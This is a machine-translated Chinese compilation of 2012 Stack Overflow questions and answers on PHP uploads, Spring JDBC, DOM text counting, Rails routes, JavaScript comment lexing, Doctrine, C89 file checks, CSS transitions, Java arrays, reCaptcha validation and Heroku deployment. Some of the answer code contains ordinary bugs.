    $display_message = " STILL DID NOT MOVE";
} 
```

请参阅 PHP 手册以供参考。[http://php.net/manual/en/function.move-uploaded-file.php](http://php.net/manual/en/function.move-uploaded-file.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T06:52:19.517

使用它可能会起作用

```
$upload_dir = "vidit/";

      $uploadfile=($upload_dir.basename($_FILES['test_pic']['name']));

if(move_uploaded_file($_FILES['test_pic']['tmp_name'], $uploadfile) ) {

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T07:14:42.380

```
<?php
  $image_fieldname = "test_pic";
  $upload_dir = "/vidit";
  $display_message ='none';
  if (move_uploaded_file($_FILES[$image_fieldname]['tmp_name'],$upload_dir . '/' . $_FILES[$image_fieldname]['name'] && is_writable($upload_dir)) {
    $display_message = "file moved successfully";
  } else {
    $display_message = " STILL DID NOT MOVE";
  }
?> 
```

还添加了缩进。需要应用文件名，或者就像将文件作为无扩展名文件上传一样。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-10-09T08:57:02.657

在 root(www) 中创建 tmp 目录并更改目录路径绝对有效/在您的目录名称是强制性的之后

$upload_dir = $_SERVER['DOCUMENT_ROOT'].'/tmp/';

# java - 如何使用 NamedParameterJdbcTemplate 检索 Decimal(4,2)

> ID：12659269
> 
> 赞同：2
> 
> 时间：2012-09-30T06:47:14.857
> 
> 标签：java, spring-jdbc

我正在尝试使用从数据库`NamedParameterJdbcTemplate`中检索`Decimal(4,2)`值。如果它是一个`int`值，我可以做到，`NamedParameterJdbcTemplate.queryForInt()`但我没有找到用于检索小数的类似函数。请帮忙。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T07:00:27.297

您可以使用以下`queryForObject`方法`NamedParameterJdbcTemplate`

```
// Thanks to  Mark Rotteveel
BigDecimal result = (BigDecimal)template.queryForObject("select 1.0 from dual", new HashMap(), java.lang.BigDecimal.class); 
```

# javascript - 如何搜索 DOM 以计算在产品页面上找到的 $ 符号的数量？

> ID：12659270
> 
> 赞同：1
> 
> 时间：2012-09-30T06:47:16.330
> 
> 标签：javascript, html, dom

我正在寻找找到一个页面上有多少个 $ 符号的最佳方法。有没有比阅读`document.body.innerHTML`和计算有多少 $-as 更好的方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T09:57:18.030

您的问题可以分为两部分：

1.  我们如何获取没有 HTML 标签的网页文本内容？

我们可以稍微概括一下第二个问题。

2.  我们如何在另一个字符串中找到字符串出现的次数？

以及“做到这一点的最佳方法”：

Amaan 得到了找到文本的正确想法，但让我们更进一步。

```
var text = document.body.innerText || document.body.textContent; 
```

添加`textContent`到代码中有助于我们覆盖更多浏览器，因为`innerText`并非所有浏览器都支持。

第二部分有点棘手。这完全取决于页面上出现的“$”符号的数量。

例如，如果我们确定在页面上至少出现一次该符号，我们将使用以下代码：

```
text.match(/\$/g).length; 
```

它对给定的字符串执行全局正则表达式匹配并计算返回数组的长度。它非常快速和简洁。

另一方面，如果我们不确定该符号是否至少出现在页面上一次，我们应该将代码修改为如下所示：

```
if (match = text.match(/\$/g)) {
  match.length;
} 
```

这只是检查 match 函数返回的值，如果它为 null，则不执行任何操作。

我建议仅当页面中出现大量符号或您要执行多次搜索时才使用第三个选项。这是一个自定义函数（取自[此处](https://stackoverflow.com/a/7924240/691148)），用于计算指定字符串在另一个字符串中的出现次数。它比其他两个表现更好，但更长且更难理解。

```
var occurrences = function(string, subString, allowOverlapping) {
  string += "";
  subString += "";
  if (subString.length <= 0) return string.length + 1;
  var n = 0,
      pos = 0;
  var step = (allowOverlapping) ? (1) : (subString.length);
  while (true) {
    pos = string.indexOf(subString, pos);
    if (pos >= 0) {
      n++;
      pos += step;
    } else break;
  }
  return (n);
};

occurrences(text, '$'); 
```

我还包括一个小的 jsfiddle ['基准'](http://jsfiddle.net/qgnYT/)，所以你可以自己比较这三种不同的方法。

另外：不，没有比获取正文并计算有多少“$”符号更好的方法了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:15:11.550

您可能应该使用`document.body.innerText`或`document.body.textContent`避免让您的 HTML 给您带来误报。

像这样的东西应该工作：

```
document.body.innerText.match(/\$/g).length; 
```

我能想到的另一种方法是[`window.find`](https://developer.mozilla.org/en-US/docs/DOM/window.find)像这样使用：

```
var len = 0;
while(window.find('$') === true){
    len++;
} 
```

`onload`（这可能不可靠，因为它取决于用户最后单击的位置。如果您在任何用户交互之前这样做，它将正常工作。）

# ruby-on-rails - 没有路线匹配

> ID：12659271
> 
> 赞同：0
> 
> 时间：2012-09-30T06:47:23.403
> 
> 标签：ruby-on-rails, ruby-on-rails-3.1

与课程和课程实例有关联。当我访问 url /courses/1/course_instances/new 时，我收到以下错误。

这是我得到的错误：

```
No route matches {:controller=>"course_instances", :course_id=>nil} 
```

楷模

课程：

```
class Course < ActiveRecord::Base
   attr_accessible :code, :credits, :description, :hours, :id, :name, :pass_mark
   has_many :course_instances, :dependent => :destroy
   accepts_nested_attributes_for :course_instances
end 
```

课程实例

```
class CourseInstance < ActiveRecord::Base
   attr_accessible :end_date, :id, :start_date
   belongs_to :course
end 
```

路线

```
Sis::Application.routes.draw do
   resources :courses do
     resources :course_instances
   end
   root :to => 'home#index'
end 
```

课程实例控制器

```
class CourseInstancesController < ApplicationController

  before_filter :find_course

  def new
    @course_instance = @course.course_instances.build
    respond_to do |format|
       format.html
    end
  end

  def find_course
    @course = Course.find(params[:course_id])
  end
end 
```

新的.html.erb

```
<%= form_for ([@course, @course_instance]) do |f| %>
   ---- excluded for brevity ---- 
```

耙子路线

```
new_course_course_instance GET    /courses/:course_id/course_instances/new(.:format)     course_instances#new 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T20:11:51.203

Am not sure what I did but it started to work. I tried backtracking to recreate the error however I have been unsuccessful so far. Weird! Thanks for the help from everyone!

# java - zxing qr-code扫描仪在android上将上转换为下？

> ID：12659274
> 
> 赞同：0
> 
> 时间：2012-09-30T06:47:44.987
> 
> 标签：java, android, barcode, qr-code, zxing

我有一个非常奇怪的问题。我在**android上使用****zxing**进行二维码扫描。它扫描 url，获取 url 的**json**响应，然后执行数据。问题是当 q-code 扫描 url 时，它会将 url 中的所有大写字母转换为小写，这不应该发生。

 ****例如。如果我编码：

> [http://example.com/test.php?id=6tGHy](http://example.com/test.php?id=6tGHy)

到二维码。

然后当扫描此二维码时，它会返回：

> [http://example.com/test.php?id=6tghy](http://example.com/test.php?id=6tghy)

请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T11:03:27.887

不，它绝对不是小写 URL——我写了它并且很清楚这会破坏 URL！

您的编码器可能是小写的。要找出答案，请在此处上传 QR 码，它会准确显示其编码内容：http: [//zxing.org/w/decode.jspx](http://zxing.org/w/decode.jspx)****

# javascript - 如果评论是安全的，那么为什么`x = 0; x+/*cmt*/+;` 或 `var f/*cmt*/oo = 'foo';` 有用吗？

> ID：12659275
> 
> 赞同：3
> 
> 时间：2012-09-30T06:47:47.617
> 
> 标签：javascript, syntax, comments

[这个](https://stackoverflow.com/questions/12659020/are-comments-100-safe-on-all-the-major-environments/12659032#comment17078409_12659032)线程启发了这个问题。这里又是代码示例。我正在寻找一个确切地说明正在发生的事情的答案。

两者都`x = 0; x+/*cmt*/+;`产生`var f/*cmt*/oo = 'foo';` 语法错误，从而导致[这个](https://stackoverflow.com/q/12659020/1597180)问题的答案错误。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-30T06:50:37.230

你打断了一个词而不是一个句子。++ 和 foo 是单词。人们认为你不会打断那些。

就像你不能把空格放在单词中间一样，即使空格是“安全的”。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-30T06:51:47.920

因为注释是在[词法](http://en.wikipedia.org/wiki/Lexical_analysis)级别解析的，通常被认为是空格。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-30T06:52:14.183

编译时，第一步是在词法上将其分解为单独的**标记。**注释是一种标记，运算符是另一种。您正在拆分 ++ 运算符标记，以便将其解释为两个单独的项目。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-30T07:07:35.250

来自[ECMAScript 参考](http://ecma-international.org/ecma-262/5.1/#sec-7.4)：

> 注释的**行为类似于空格**并被丢弃，除了，如果 MultiLineComment 包含行终止符，则整个注释被认为是 LineTerminator 以便通过句法语法进行解析。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-30T07:11:21.057

正如许多其他人指出的那样，词法解析决定了事情将如何发展。

让我指出一些例子：

```
ax + ay - 0x01; /* hello */
^----^---------------------- Identifier (variables)
   ^----^------------------- Operator
          ^----------------- literal constant (int)
              ^------------- Statement separator
  ^-^--^-^---  ^------------ Whitespace (ignored)
                [_________]- Comments (ignored) 
```

所以生成的令牌列表将是：

```
identifier("ax");
operator("+");
identifier("ay");
operator("-");
const((int)0x01);
separator(); 
```

但如果你这样做：

```
a/* hello */x + ay - 0x01;
^-----------^---^----------- Identifier (variables)
              ^----^-------- Operator
                     ^------ literal constant (int)
                         ^-- Statement separator
             ^-^--^-^------- Whitespace (ignored)
 [_________]---------------- Comments (ignored) 
```

生成的令牌列表将是：

```
identifier("a");
identifier("x"); // Error: Unexpected identifier `x` at line whatever
operator("+");
identifier("ay");
operator("-");
const((int)0x01);
separator(); 
```

当在运算符中插入注释时也会发生同样的情况。

所以你可以看到注释的行为就像空格一样。

事实上，我最近刚刚阅读了一篇关于使用 JavaScript 编写简单解释器的文章。它帮助我回答了这个问题。[http://www.codeproject.com/Articles/345888/How-to-write-a-simple-interpreter-in-JavaScript](http://www.codeproject.com/Articles/345888/How-to-write-a-simple-interpreter-in-JavaScript)

# android - 什么是实时 GPS 跟踪系统（核心定位、地理定位）的最佳客户端解决方案

> ID：12659279
> 
> 赞同：-1
> 
> 时间：2012-09-30T06:48:44.523
> 
> 标签：android, iphone, ios, geolocation, gps

我需要跟踪几个设备的位置（iPhone/Galaxy）。
我希望他们每隔几秒或在发生重大（几米）位置变化时向我发送他们的纬度/经度。
通过发送我的意思是向我的服务器发送 HTTP 请求。Websocket 是可能的。

**我正在寻找的解决方案是第 3 方，即类似于[Pushover](https://pushover.net)和[UrbanAirship](http://urbanairship.com)（它们是第 3 方推送通知提供商）。**

就是这样，一个非常简单的 iPhone/Galaxy 应用程序，用户在其中配置一个 URL，我将向他提供应用程序报告位置的 URL。

至于服务器端 - 我已经准备好了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T12:06:38.983

对于 iPhone，您必须检查 Apple 提供的服务。我不使用 iPhone，我无法帮助您。

对于 Android，您可以使用 LocationManager 提供的服务：

[http://developer.android.com/guide/topics/location/index.html](http://developer.android.com/guide/topics/location/index.html)

[http://developer.android.com/guide/topics/location/index.html](http://developer.android.com/guide/topics/location/index.html)

[http://marakana.com/forums/android/examples/42.html](http://marakana.com/forums/android/examples/42.html)

请特别参阅[requestLocationUpdates](http://developer.android.com/reference/android/location/LocationManager.html#requestLocationUpdates%28long,%20float,%20android.location.Criteria,%20android.app.PendingIntent%29)和[locationListener](http://developer.android.com/reference/android/location/LocationListener.html)。

您可以向位置管理器注册以获取位置更新。之后，只需使用 GET 或 PUT HTTP 调用将新坐标发送到您的服务器。

# javascript - 循环内的Javascript点击功能

> ID：12659281
> 
> 赞同：1
> 
> 时间：2012-09-30T06:49:04.340
> 
> 标签：javascript, jquery

我对 javascript 不太好，但我已经搜索了 5 个小时，但没有运气。

我试图让按钮工作，如果我一个接一个地编写代码，它工作正常，一切都很好。

我能理解这个问题。单击部分仅在实际进行 CLICK 时才起作用。我对吗？但是我如何纠正它才能像我需要的那样工作？

我可以将 $(name) 值发送到 click 函数，所以当我说 button-1 被点击时，scrollTop: $(button-1-block) 或者我在这种情况下是否过度思考。

```
 var divHeight = 700
    var blocks = document.getElementsByClassName("blocks");
    var i = 1;

    for(i=1;i<blocks.length+1; i++) {
        var name = "#button-"+i;
        var blx = "#block-"+i;
        $(name).click(function(){
            $('html, body').stop().animate({
                scrollTop: $(blx).offset().top - ( $(window).height() - divHeight )/2 
              }, 2100,'easeInOutExpo');
         });

    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T07:02:09.617

试试这个：

```
var divHeight = 700
//var blocks = $(".blocks");

$('[id^="button"]').click(function(){
     var block = '#block-' + this.id.match(/\d+/g).join("");
     $('html, body').stop().animate({
          scrollTop: $(block).offset().top - ( $(window).height() - divHeight )/2 
     }, 2100,'easeInOutExpo');
}); 
```

# doctrine - Doctrine 类 EntitySerializer 在每个实体关系上返回 null

> ID：12659282
> 
> 赞同：1
> 
> 时间：2012-09-30T06:49:46.270
> 
> 标签：doctrine, doctrine-orm

我需要获取 Doctrine 2 实体的数组表示。我在网上找到了这个库，我为此目的使用这个类：

[https://github.com/borisguery/bgylibrary/blob/master/library/Bgy/Doctrine/EntitySerializer.php](https://github.com/borisguery/bgylibrary/blob/master/library/Bgy/Doctrine/EntitySerializer.php)

问题是该类运行良好，但问题是与另一个实体（多对一）相关的实体的每个属性在结果数组的每个字段上都具有 null 值。

一个真实的例子：

我有实体人：

```
<?php 
```

命名空间实体；

/** * @Entity(repositoryClass="Repositories\PersonRepository") */ class Person {

```
/**
 * @Id @GeneratedValue
 * @Column(type="bigint")
 * @var integer
 */
protected $id;

/**
 * @Column(type="string", length=32)
 * @var string
 */
protected $firstname;

/**
 * @Column(type="string", length=32, nullable="true")
 * @var string
 */

 /**
 * @ManyToOne(targetEntity="Gender", cascade={"detach"})
 * @JoinColumn(name="gender", referencedColumnName="id")
 */
protected $gender; 
```

我在数据库中存储了一个人对象，其性别（id->1 和 name->Male）。当我使用此类将该人员对象转换为数组时，我得到了以下结果：

“id”：“1”，“名字”：“lh”，“中间名”：“”，“姓氏”：“kbkjbkl”，“dob”：{“日期”：“1982-05-25 00:00： 00”，“timezone_type”：3，“timezone”：“America/New_York”}，“home_phone_number”：“8798798”，“work_phone_number”：“987987”，“cell_phone_number”：“987987”，“ssn”：“98798” ", "email": "kjhlkjlk", **"gender": { "id": null, "name": null },** "race": { "id": null, "name": null }, "address": {“身份证”：空，“address_line1”：null，“address_line2”：null，“city”：null，“zip”：null，“state”：null }，“marital_status”：{ “id”：null，“name”：null }

注意突出显示的性别值（有空值）。当它应该有 1 和男性。

我将非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-17T16:16:01.363

您可能还会在反序列化期间丢失一些信息，因为您的级联选项仅在分离时。为了确保信息在反序列化时返回到您的实体中，您应该添加 merge - cascade = {"detach", "merge"} 。或者使用 - cascade={"all"} 参考见：8.6。传递持久性/级联操作： [Doctrine 文档](http://docs.doctrine-project.org/en/latest/reference/working-with-associations.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-01T20:27:41.947

我得到了它。问题是，当学说从数据库加载实体时，除非您访问它，否则不会加载关系。当您访问其中一个关系时，学说会执行查询并获取信息。在我的情况下，所有关系都为空，因为从未被访问过。这种加载方法在学说中称为延迟加载。

# c - 如何通过 C89 检查文件是否存在？

> ID：12659284
> 
> 赞同：1
> 
> 时间：2012-09-30T06:50:19.720
> 
> 标签：c

我为我糟糕的英语道歉。

不同的文件可以有不同的权限。例如，我可以没有文件读/写权限，但这个文件是存在的。如何通过 C89 检查此类文件的存在？

谢谢你。最好的祝福

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T07:04:15.963

在**纯 ISO C89 中，没有检查文件是否存在的良好且可移植的方法。**但是，有实现定义的解决方案或其他特定于操作系统的扩展。例如：

```
int file_exists(const char *name)
{
     return access(name, F_OK) == 0;
} 
```

请注意，这个 ( `access()`) 不是 C89 的一部分，但人们关心的大多数系统都有它。

或者有

```
int file_exists(const char *name)
{
    FILE *f = fopen(name, "r");
    if ((f == NULL) && (errno == ENOENT)) {
        return 0;
    }
    fclose(f);
    return 1;
} 
```

这又不是 C89，但大多数符合 C89 的系统将提供`ENOENT`.

另一种选择是使用该函数，如果文件不存在`stat()`，它也会返回 -1 并设置`errno`为。`ENOENT`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T07:05:21.197

如果您坚持使用 C89，则没有通用的方法来检查文件是否存在。

C89、POSIX 函数之外还有一些标准函数：

[统计（）](http://pubs.opengroup.org/onlinepubs/009695399/functions/stat.html)

[fstat()](http://pubs.opengroup.org/onlinepubs/9699919799/functions/fstat.html)

无论如何，这取决于操作系统，因为语言本身不提供此类功能。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-30T07:22:15.700

没有可移植的方法来确定文件是否存在；您必须求助于系统特定的方法（例如`access`或`stat`来自 POSIX.1）。有时，可能无法检查命名文件是否存在，因为您无权读取可能包含它的目录。

# firefox - 为什么这个 CSS 悬停过渡在 FireFox 中失败？

> ID：12659285
> 
> 赞同：1
> 
> 时间：2012-09-30T06:50:22.537
> 
> 标签：firefox, css, css-transitions

我在这里发布了一个简单的例子：http: [//jsfiddle.net/tkJgg/](http://jsfiddle.net/tkJgg/)

我知道 FF 需要为转换属性设置初始值。我想我有。有什么想法有什么问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T09:33:49.157

悬停转换在 Mozilla 中不会失败，但有时由于代码错误或加载浏览器失败会禁用此属性。**要忽略这个**问题，您应该在 CSS 过渡中定义浏览器。以下是定义不同主要浏览器时应使用哪些代码的示例

```
#mydiv a:hover{
   -moz-transition:all 0.5s ease-in-out;     /*For Mozilla Browser*/ 
   -webkit-transition:all 0.5s ease-in-out;  /*For Chrome and Safari*/
   -o-transition:all 0.5s ease-in-out;       /*For Opera Browser*/
    transition:all 0.5s ease-in-out;         /*For Other Browser*/
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T06:57:08.543

用这个

```
-moz-transition: all 0.5s ease-in-out; 
```

[演示](http://jsfiddle.net/tkJgg/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T07:08:10.897

删除`0`最后：

```
 -moz-transition: all 0.5s ease; 
```

或在零之后指定 s(seconds)：

```
-moz-transition: all 0.5s ease 0s; 
```

语法说：

```
 <single-transition> = [ none | <single-transition-property> ] || <time> || <single-transition-timing-function> || <time> 
```

此处`<time>`定义的位置：

[时间](https://developer.mozilla.org/en-US/docs/CSS/time)

*CSS 数据类型表示以秒或毫秒表示的时间维度。它们由一个`<number>`紧随其后的单元组成。*

而且：

“*虽然允许无单位零`<length>`，但对所有其他单位无效。* ”

# css - 粘页脚问题 - 页脚下突然出现空白区域

> ID：12659287
> 
> 赞同：2
> 
> 时间：2012-09-30T06:51:02.393
> 
> 标签：css, footer, sticky-footer

我为一个带有 CSS 粘性页脚的朋友创建了一个网站。

它应该看起来像这里：[http ://abchealth.info/doc-mike-special/test2/](http://abchealth.info/doc-mike-special/test2/)

它工作得很好，直到我在[http://abchealth.info/doc-mike-special/](http://abchealth.info/doc-mike-special/)添加了长销售页面的最后一段，然后突然页脚布局搞砸了，突然在下面有很多空白空间页脚:(

我不知道为什么，我自己是个业余爱好者……有人可以帮忙吗？

为了节省时间，我提取了似乎最有可能相关的 html 和 css，这会有所帮助：

HTML：

```
<body>

<div id="mastercontainer">
</div>

<div id="footerclear">
</div>

<div id="footer">
</div>

</body> 
```

CSS

```
div#wrap {
margin: 0 auto;
width: 100%;
padding-bottom: 605px;
}
div#mastercontainer {
width: 100%;
height: 100%;
min-height: 100%;
}
div#footerclear {
}
div#footer {
position: relative;
margin-top: -570px;
height: 570px;
clear: both;
background-image: url(http://abchealth.info/images/footer-bg.jpg);
background-repeat: repeat-x;
} 
```

我将非常感谢任何（初学者友好的）帮助，谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T06:55:44.440

1.  `<div id="main">`删除main.css 第 35 行中的 100% 宽度，以便删除垂直滚动

在你的演示中

![在此处输入图像描述](../Images/3b8e4e051462742866246a27808bed37.png)

在做出正确的结果之后

> ![在此处输入图像描述](../Images/52c74ef5f80edda2037371748b047e64.png)

# java - 汽车游戏的数组交换

> ID：12659288
> 
> 赞同：-1
> 
> 时间：2012-09-30T06:51:07.197
> 
> 标签：java, arrays, swap

我正在尝试设计一个程序，如果它不是 0，则将数组中的值 0 与前面的元素交换。

例如，如果数组是，`1 1 0 1 1 1`那么程序将继续交换，直到它变成`0 1 1 1 1 1`

但是当我运行时会发生这种`IndexOutOfBoundException`情况。我什至尝试将 for 循环更改为：

```
for(int i = 1; i < newLane.length; i++) 
```

这解决了越界问题，但使其功能不正确。

以下是我的代码：

```
public static int[] down(int[] lane) {   
    int lan = lane.length; // length of array
    int[]newLane = new int[lan];  // creates new 1d matrix

    for(int i = 1; i < newLane.length; i++) {  
        if(newLane[i-1] != 0 && newLane[i] == 0 ){ // getting out of bounds error
            int tmp = newLane[i - 1];
            newLane[i - 1] = newLane[i];
            newLane[i] = tmp;
        }
    }

    return newLane;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T07:11:34.860

我认为您可以简单地对数组进行排序：

```
public static int[] down(int[] lane){       
    int lan = lane.length; // length of array
    int[]newLane = Arrays.copyOf(lane,lan)  // creates new 1d matrix
    Arrays.sort(newLane);
    return newLane;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:05:32.073

您无处使用 array 的元素`Lane`。当前`newLane`是一个空数组。我已将值分配`Lane`给`newLane`

将您的功能更改为以下

```
public static int[] down(int[] lane){   

    int lan = lane.length; // length of array
    int[]newLane = new int[lan];  // creates new 1d matrix
    newLane = lane;

     for(int i = 1; i < newLane.length; i++) {  

         if(newLane[i-1] != 0 && newLane[i] == 0 ){ // getting out of bounds error
            int tmp = newLane[i - 1];
            newLane[i - 1] = newLane[i];
            newLane[i] = tmp;
            }

    }

         if(newLane[0]!=0 && newLane[1]==0)
         {
             int tmp = newLane[0];
                newLane[0] = newLane[1];
                newLane[1] = tmp;
         }
     return newLane;
    } 
```

**更新** 在 for 循环之后，检查第 0 个元素是否非零。如果是，则先与它交换。

```
if(newLane[0]!=0 && newLane[1]==0)
         {
             int tmp = newLane[0];
                newLane[0] = newLane[1];
                newLane[1] = tmp;
         } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T07:07:25.143

正如我的评论已经说过的那样：你很接近。
只需添加

```
if(newLane[0] == 0) newLane[0] == 1; 
```

在for循环之前。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-30T07:15:49.883

我会试试这个

```
 public static int[]  swapping(int[] lane) 
  {   
int[] result = new int[lane.length];  

 for(int i = 0; i < result .length; i++) {  
      if ( result[i]==0) 
      {
        if( i==0)
           {
           }
         else
            {
       temp = result[i] ; 
       result[i]  = result [i-1] ; 
       result [i-1] = temp ; 
             }
     else
      {
       }
 return result ;
} 
```

# php - jquery 验证 reCaptcha

> ID：12659294
> 
> 赞同：0
> 
> 时间：2012-09-30T06:52:03.450
> 
> 标签：php, jquery, recaptcha, jquery-validate

我在使用 jquery Validate 插件验证此表单时遇到了一些问题，当响应有效时我没有得到任何响应，而且我不知道为什么...这是 html：

```
 <form id="signin_form"  action="" method="post">

<div id="recaptcha_widget" style="display:none">

       <div id="recaptcha_image"></div>
       <div class="recaptcha_only_if_incorrect_sol" style="color:red">Incorrect please try again</div>

       <p><span class="recaptcha_only_if_image">Enter the <br />words above:</span>
       <span class="recaptcha_only_if_audio">Enter the numbers you hear:</span>

       <span><input type="text" id="recaptcha_response_field" name="recaptcha_response_field" /></span></p>

       <div class="get_another_captcha"><a href="javascript:Recaptcha.reload()">Get another CAPTCHA</a></div>
       <div class="recaptcha_only_if_image"><a href="javascript:Recaptcha.switch_type('audio')">Get an audio CAPTCHA</a></div>
       <div class="recaptcha_only_if_audio"><a href="javascript:Recaptcha.switch_type('image')">Get an image CAPTCHA</a></div>

       <div class="help"><a href="javascript:Recaptcha.showhelp()">Help</a></div>

     </div>

     <script type="text/javascript"
        src="http://www.google.com/recaptcha/api/challenge?k=public_key">
     </script>
     <noscript>
       <iframe src="http://www.google.com/recaptcha/api/noscript?k=public_key"
            height="300" width="500" frameborder="0"></iframe><br>
       <textarea name="recaptcha_challenge_field" rows="3" cols="40">
       </textarea>
       <input type="hidden" name="recaptcha_response_field"
            value="manual_challenge">
     </noscript>

        <p><span></span><span> <input type="submit" value="Send" class="btn-submit" />     </span></p>

</form> 
```

这是javascript：

```
$("#signin_form").validate({
    rules: {
        recaptcha_response_field: {
            required: true,
            remote: { 
                url:"verify.php",
                type:"post",
                async:false,
                data: "recaptcha_challenge_field=" +    $('#recaptcha_challenge_field').val() + "&recaptcha_response_field=" + $('#recaptcha_response_field').val()
            }
        }
    },
    messages: {
        recaptcha_response_field: {
            required: "*",
            remote: "Invalid captcha"
        }
    }
}); 
```

和 verify.php 如下：

```
require_once('recaptchalib.php');
$privatekey = "private_key";
$resp = recaptcha_check_answer ($privatekey,
                            $_SERVER["REMOTE_ADDR"],
                            $_POST["recaptcha_challenge_field"],
                            $_POST["recaptcha_response_field"]);
if (!$resp->is_valid) {  

 echo "false";
 }
 else{ 
 echo "true";
 } 
```

有谁知道为什么？，我似乎无法找到我一直在努力尝试的问题..，不知道为什么当验证码正确时不会发生任何事情......提前非常感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-23T04:02:21.013

代码的问题在于它`recaptcha_response_field`在设置规则时获取值，而不是在验证它们时。

固定代码：

```
$("#signin_form").validate({
    rules: {
        recaptcha_response_field: {
            required: true,
            remote: { 
                url:"verify.php",
                type:"post",
                async:false,
                data: {
                    recaptcha_challenge_field: function(){ return $('#recaptcha_challenge_field').val(); },
                    recaptcha_response_field: function(){ return $('#recaptcha_response_field').val(); }
                }
            }
        }
    },
    messages: {
        recaptcha_response_field: {
            required: "*",
            remote: "Invalid captcha"
        }
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-06T06:50:02.260

```
echo json_encode(true); 
```

代替

```
echo 'true'; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T07:04:39.640

问题是您没有使用来自`verify.php`.

这是获取响应和使用它们的教程。

[http://api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)

[http://api.jquery.com/jQuery.post/](http://api.jquery.com/jQuery.post/)

# mysql - 在 Heroku 上使用 Ruby 和 XEROUND

> ID：12659295
> 
> 赞同：1
> 
> 时间：2012-09-30T06:52:11.920
> 
> 标签：mysql, ruby-on-rails, heroku, xeround

首先，我想知道是否有人使用 XEROUND 插件在 Heroku 上成功构建了 Ruby on Rails 应用程序？

我的 PHP 应用程序可以与 XEROUND 附加组件（相同的数据库）一起正常工作。但是，我的 Ruby 应用程序在启动时出错。我们很抱歉，但有些不对劲。

在我的开发机器上，当我运行时：

```
rails server -e production 
```

程序启动没有问题。

当我将代码推送到 Heroku 并启动应用程序时，我收到了 Were sorry 错误。

有任何想法吗？无论如何，在分配数据库变量之后立即输出它们吗？据我所知，这意味着修改活动记录适配器。这是Ruby本身的问题吗？它甚至应该进入连接池吗？在 Heroku 之外使用 XEROUND 会更好（不是作为附加组件）吗？

* * *

我的 database.yml 包含

```
production:
  adapter: mysql2
  encoding: utf8
  database: <%= ENV['XEROUND_DATABASE_NAME'] %>
  username: <%= ENV['XEROUND_DATABASE_USERNAME'] %>
  password: <%= ENV['XEROUND_DATABASE_PASSWORD'] %>
  host:  <%= ENV['XEROUND_DATABASE_HOST'] %>
  port:  <%= ENV['XEROUND_DATABASE_PORT'] %> 
```

当我对值进行硬编码时，我会收到相同的消息。

* * *

关于 Heroku 的构建信息：

```
git push heroku master
Counting objects: 15, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (10/10), done.
Writing objects: 100% (10/10), 1.19 KiB, done.
Total 10 (delta 7), reused 0 (delta 0)

-----> Heroku receiving push
-----> Ruby/Rails app detected
-----> Installing dependencies using Bundler version 1.2.1
       Running: bundle install --without development:test --path vendor/bundle - -binstubs bin/
       Fetching gem metadata from ....rubygems.org/.........
       Using rake (0.9.2.2)
       Using i18n (0.6.1)
       Using multi_json (1.3.6)
       Using activesupport (3.2.1)
       Using builder (3.0.3)
       Using activemodel (3.2.1)
       Using erubis (2.7.0)
       Using journey (1.0.4)
       Using rack (1.4.1)
       Using rack-cache (1.2)
       Using rack-test (0.6.2)
       Using hike (1.2.1)
       Using tilt (1.3.3)
       Using sprockets (2.1.3)
       Using actionpack (3.2.1)
       Using mime-types (1.19)
       Using polyglot (0.3.3)
       Using treetop (1.4.10)
       Using mail (2.4.4)
       Using actionmailer (3.2.1)
       Using arel (3.0.2)
       Using tzinfo (0.3.33)
       Using activerecord (3.2.1)
       Using mysql2 (0.3.11)
       Using activerecord-mysql2-adapter (0.0.3)
       Using activeresource (3.2.1)
       Using bundler (1.2.1)
       Using coffee-script-source (1.3.3)
       Using execjs (1.4.0)
       Using coffee-script (2.2.0)
       Using rack-ssl (1.3.2)
       Using json (1.7.5)
       Using rdoc (3.12)
       Using thor (0.14.6)
       Using railties (3.2.1)
       Using coffee-rails (3.2.2)
       Using jquery-rails (2.1.3)
       Using rails (3.2.1)
       Using sass (3.2.1)
       Using sass-rails (3.2.5)
       Using uglifier (1.3.0)
       Your bundle is complete! It was installed into ./vendor/bundle
       Cleaning up the bundler cache.
-----> Writing config/database.yml to read from DATABASE_URL
-----> Preparing app for Rails asset pipeline
       Detected manifest.yml, assuming assets were compiled locally
-----> Rails plugin injection
       Injecting rails_log_stdout
       Injecting rails3_serve_static_assets
-----> Discovering process types
       Procfile declares types      -> (none)
       Default types for Ruby/Rails -> console, rake, web, worker
-----> Compiled slug size: 8.7MB
-----> Launching... done, v18
